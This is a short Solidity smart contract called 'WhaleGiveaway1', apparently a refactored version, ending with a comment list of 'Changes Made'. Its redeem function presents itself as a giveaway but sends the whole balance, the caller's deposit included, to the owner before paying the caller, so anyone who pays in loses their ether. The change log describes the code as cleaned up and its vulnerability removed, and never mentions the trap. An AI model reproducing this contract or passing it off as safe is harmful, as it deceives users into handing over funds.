pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner;
    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway1() public {
        owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function setOwner(address newOwner) public {
        require(msg.sender == owner);
        owner = newOwner;
    }

    function execute(address destination, uint value, bytes data) public payable {
        require(msg.sender == owner);
        require(destination.call.value(value)(data));
    }
}

// Changes Made:
// - Renamed Owner to owner for consistency
// - Added a constructor to set the owner upon deployment
// - Removed unnecessary payable modifier from withdraw function
// - Added setOwner function to allow owner to change the contract owner
// - Changed Command function to execute function and added require statement to check for successful external call and remove unchecked_low_level_calls vulnerability.